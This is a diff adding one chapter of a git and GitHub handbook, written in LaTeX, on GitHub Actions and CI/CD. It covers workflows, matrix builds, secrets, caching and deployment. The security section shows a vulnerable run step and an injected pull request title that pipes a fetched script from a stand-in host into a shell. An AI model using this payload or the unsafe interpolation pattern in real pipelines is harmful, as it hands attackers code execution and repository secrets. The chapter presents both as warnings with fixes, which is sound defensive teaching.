@@ -1,0 +1,435 @@
+\documentclass[11pt]{article}
+\usepackage{rabbithole}
+
+\phasenumber{14}
+\phasetitle{Actions and CI/CD}
+\phasesubtitle{Making the repository do the work, and the two triggers that can hand it to a stranger.}
+
+\hypersetup{pdftitle={Rabbit Holes, Phase 14: Actions and CI/CD},
+            pdfauthor={Accelerate, Manipal University Jaipur},
+            pdfsubject={git and GitHub handbook}}
+
+\begin{document}
+\maketitlepage
+
+\section{What a workflow is}
+
+A YAML file in \co{.github/workflows/} that GitHub runs on a virtual machine when
+something happens in the repository.
+
+That is the entire concept. Everything else is detail.
+
+\begin{terminal}
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - run: pip install -r requirements.txt
+      - run: pytest -v
+\end{terminal}
+
+\vspace{0.5em}
+\begin{tabularx}{\linewidth}{@{}L{2.4cm} X@{}}
+\toprule
+\rhtablehead{Key} & \rhtablehead{Means} \\
+\midrule
+\co{on} & What triggers this \\
+\co{jobs} & Independent units of work, parallel by default \\
+\co{runs-on} & Which virtual machine \\
+\co{steps} & Ordered actions inside one job \\
+\co{uses} & Run a published action \\
+\co{run} & Run a shell command \\
+\bottomrule
+\end{tabularx}
+\vspace{0.5em}
+
+\begin{note}
+Each job gets a fresh machine. Two jobs share nothing unless you explicitly pass
+data between them with artifacts or outputs. This surprises people who expect job
+two to see the files job one built.
+\end{note}
+
+\section{Triggers}
+
+\begin{terminal}
+on:
+  push:
+    branches: [main]
+    paths: ['src/**', '!**.md']
+  pull_request:
+    types: [opened, synchronize, reopened]
+  schedule:
+    - cron: '0 3 * * 1'
+  workflow_dispatch:
+    inputs:
+      environment:
+        type: choice
+        options: [staging, production]
+  release:
+    types: [published]
+  issues:
+    types: [opened]
+\end{terminal}
+
+\co{workflow\_dispatch} adds a Run button in the Actions tab and enables
+\co{gh workflow run}. Add it to almost everything, because being unable to re-run a
+workflow by hand is annoying at exactly the wrong moment.
+
+\co{paths} avoids running the full test suite when someone fixed a typo in the
+README. On a busy repository this saves real time and money.
+
+\section{Matrix builds}
+
+Run the same job across many configurations:
+
+\begin{terminal}
+jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+        python: ["3.10", "3.11", "3.12"]
+        exclude:
+          - os: windows-latest
+            python: "3.10"
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python }}
+      - run: pytest
+\end{terminal}
+
+Nine combinations minus one exclusion, all in parallel.
+
+\co{fail-fast: false} is worth setting. The default cancels every remaining job as
+soon as one fails, which hides whether the failure is on one platform or all of
+them, and that is usually the first thing you want to know.
+
+\section{Secrets, variables, permissions}
+
+\begin{shell}
+gh secret set API_KEY
+gh secret set API_KEY --env production
+gh variable set REGION --body "ap-south-1"
+gh secret list
+\end{shell}
+
+\begin{terminal}
+steps:
+  - env:
+      API_KEY: ${{ secrets.API_KEY }}
+      REGION: ${{ vars.REGION }}
+    run: ./deploy.sh
+\end{terminal}
+
+Secrets are encrypted and masked in logs. Variables are plain text for
+non-sensitive configuration.
+
+\begin{trap}
+Masking is not security. A workflow that can read a secret can print it in a form
+the masker does not catch, for instance base64 encoded or one character at a time.
+
+Which means: \textbf{any code that runs in a workflow with access to your secrets can
+exfiltrate them.} That includes every third party action you use and every
+dependency they pull. This is the reasoning behind pinning actions, later in this
+phase.
+\end{trap}
+
+Restrict the automatic token to the minimum:
+
+\begin{terminal}
+permissions:
+  contents: read
+  pull-requests: write
+\end{terminal}
+
+Set it at the top of the workflow. The default is often more than a job needs, and
+this is the cheapest hardening available.
+
+\section{Caching and artifacts}
+
+Different jobs, frequently confused.
+
+\textbf{Cache} makes future runs faster. It is a performance optimisation and may be
+missing:
+
+\begin{terminal}
+- uses: actions/cache@v4
+  with:
+    path: ~/.cache/pip
+    key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
+    restore-keys: pip-${{ runner.os }}-
+\end{terminal}
+
+Building the key from a hash of the lock file means the cache invalidates exactly
+when dependencies change.
+
+\textbf{Artifacts} pass files out of a run, to you or to another job:
+
+\begin{terminal}
+- uses: actions/upload-artifact@v4
+  with:
+    name: handbook-pdfs
+    path: handbook/pdf/*.pdf
+    retention-days: 30
+\end{terminal}
+
+\begin{shell}
+gh run download <run-id> --name handbook-pdfs
+\end{shell}
+
+\begin{tryit}
+This repository's handbook could build itself. A workflow that runs on any change to
+\co{handbook/src/}, installs TeX Live, runs \co{python build.py}, and uploads the
+PDFs as artifacts means nobody needs LaTeX installed to get current copies.
+
+Add \co{on: release} and it can attach them to the release automatically.
+\end{tryit}
+
+\section{Jobs that depend on each other}
+
+\begin{terminal}
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    outputs:
+      version: ${{ steps.get.outputs.version }}
+    steps:
+      - id: get
+        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
+
+  deploy:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - run: echo "Deploying ${{ needs.test.outputs.version }}"
+\end{terminal}
+
+\co{environment: production} is the interesting one. Environments can require manual
+approval, restrict which branches may deploy, and hold their own secrets. It is how
+you get a human gate in an automated pipeline.
+
+\subsection{Concurrency}
+
+\begin{terminal}
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+\end{terminal}
+
+Pushing three times in a minute otherwise starts three runs. This cancels the older
+ones. For deployments, set \co{cancel-in-progress: false} instead, so a deploy is
+never interrupted halfway.
+
+\section{Reusing workflows}
+
+\textbf{Reusable workflows} are whole workflows called by others:
+
+\begin{terminal}
+on:
+  workflow_call:
+    inputs:
+      python-version:
+        type: string
+        required: true
+    secrets:
+      token:
+        required: true
+\end{terminal}
+
+\begin{terminal}
+jobs:
+  call:
+    uses: accelerate-muj/.github/.github/workflows/test.yml@main
+    with:
+      python-version: "3.12"
+    secrets:
+      token: ${{ secrets.MY_TOKEN }}
+\end{terminal}
+
+\textbf{Composite actions} bundle several steps into one \co{uses}. Put an
+\co{action.yml} in a directory:
+
+\begin{terminal}
+name: Setup project
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-python@v5
+      with: {python-version: "3.12"}
+    - run: pip install -r requirements.txt
+      shell: bash
+\end{terminal}
+
+Then \co{- uses: ./.github/actions/setup}.
+
+\begin{note}
+An organisation-level \co{.github} repository can hold shared workflows for every
+repository in the org, which is one more reason the \co{.github} repo exists beyond
+the community health files.
+\end{note}
+
+\section{Security}
+
+This section matters more than the rest of the phase. CI systems are a favourite
+supply chain target because they hold credentials and run other people's code.
+
+\subsection{pull\_request\_target}
+
+\begin{trap}
+\co{pull\_request} runs in a restricted context: no secrets, read-only token. That is
+correct, because the code in a pull request from a stranger is untrusted.
+
+\co{pull\_request\_target} runs the workflow \textbf{from the base branch} with
+\textbf{full secrets and a write token}, while the pull request's code is available
+to check out.
+
+If you use \co{pull\_request\_target} and then check out and execute the pull
+request's code, you have handed a complete stranger your secrets and write access to
+your repository. This is a well known and repeatedly exploited mistake.
+
+Use \co{pull\_request\_target} only for jobs that need write access and never run
+contributor code: labelling, commenting, greeting first-time contributors. That is
+exactly what this repository's \co{check-poem.yml} does, and it deliberately reads the
+changed filenames through the API rather than checking the branch out.
+
+If you must build or test contributor code with secrets, use an environment with
+required reviewers so a human approves each run.
+\end{trap}
+
+\subsection{Pin your actions}
+
+\begin{terminal}
+- uses: actions/checkout@v4
+- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
+\end{terminal}
+
+A tag is a moving pointer, as Phase 10 established, and the owner of an action can
+move it. Pinning to a full commit SHA means you run exactly the code you reviewed.
+
+For actions from GitHub itself, a major version tag is a reasonable risk. For
+anything else, pin the SHA. Dependabot will keep the pins updated with pull requests
+you can review.
+
+\subsection{Script injection}
+
+\begin{trap}
+\begin{terminal}
+- run: echo "Title: ${{ github.event.pull_request.title }}"
+\end{terminal}
+
+The title is attacker controlled. Because \co{\$\{\{ \}\}} is substituted into the
+script \emph{before} the shell sees it, a pull request titled
+\co{a"; curl evil.sh | sh; \#} becomes a command.
+
+Pass it through the environment instead, where the shell treats it as data:
+
+\begin{terminal}
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Title: $TITLE"
+\end{terminal}
+
+The rule: never interpolate \co{\$\{\{ github.event.* \}\}} directly into a
+\co{run:} block. Every workflow in this repository follows it.
+\end{trap}
+
+\section{Deploying Pages}
+
+\begin{terminal}
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+
+jobs:
+  deploy:
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci && npm run build
+      - uses: actions/upload-pages-artifact@v3
+        with: {path: ./dist}
+      - id: deployment
+        uses: actions/deploy-pages@v4
+\end{terminal}
+
+\co{id-token: write} is required for the deployment to authenticate. Leaving it out
+produces an error that does not obviously point at the cause.
+
+\section{Debugging}
+
+\begin{shell}
+gh run list --limit 10
+gh run view <id> --log-failed
+gh run watch <id>
+gh run rerun <id> --failed --debug
+\end{shell}
+
+Set the repository secrets \co{ACTIONS\_STEP\_DEBUG} and \co{ACTIONS\_RUNNER\_DEBUG}
+to \co{true} for much more verbose logs.
+
+For anything more than a small change, test locally with \co{act} rather than pushing
+twenty commits called ``fix ci'':
+
+\begin{shell}
+act -j test
+\end{shell}
+
+\section{Reference}
+
+\vspace{0.5em}
+\begin{tabularx}{\linewidth}{@{}L{6.2cm} X@{}}
+\toprule
+\rhtablehead{Goal} & \rhtablehead{How} \\
+\midrule
+Manual run button & \co{on: workflow\_dispatch} \\
+Skip CI for docs-only changes & \co{on.push.paths} \\
+Test several versions & \co{strategy.matrix} \\
+See all failures, not the first & \co{fail-fast: false} \\
+Speed up dependency installs & \co{actions/cache} \\
+Get files out of a run & \co{actions/upload-artifact} \\
+Require a human before deploy & \co{environment} with reviewers \\
+Cancel superseded runs & \co{concurrency} with \co{cancel-in-progress} \\
+Least privilege token & top-level \co{permissions:} block \\
+Safe handling of user text & pass via \co{env:}, never inline \\
+Only the failing log & \co{gh run view <id> -{}-log-failed} \\
+\bottomrule
+\end{tabularx}
+\vspace{0.5em}
+
+\checkyourself{
+\begin{enumerate}
+  \item What is the difference between a cache and an artifact?
+  \item Why is \co{pull\_request\_target} dangerous, and what is it safe for?
+  \item Why pin an action to a SHA rather than a tag? (Phase 10 has the reason.)
+  \item Rewrite this safely: \co{run: echo "\$\{\{ github.event.issue.title \}\}"}
+  \item Two jobs, and job two cannot see job one's files. Why, and what fixes it?
+\end{enumerate}}
+
+\vspace{1em}
+{\color{rhborder}\rule{\linewidth}{0.8pt}}
+
+\textbf{Next:} Phase 15, \emph{Being a maintainer}, the longest phase here, and the
+one least about commands. It is about running a project other people depend on.
+
+\end{document}
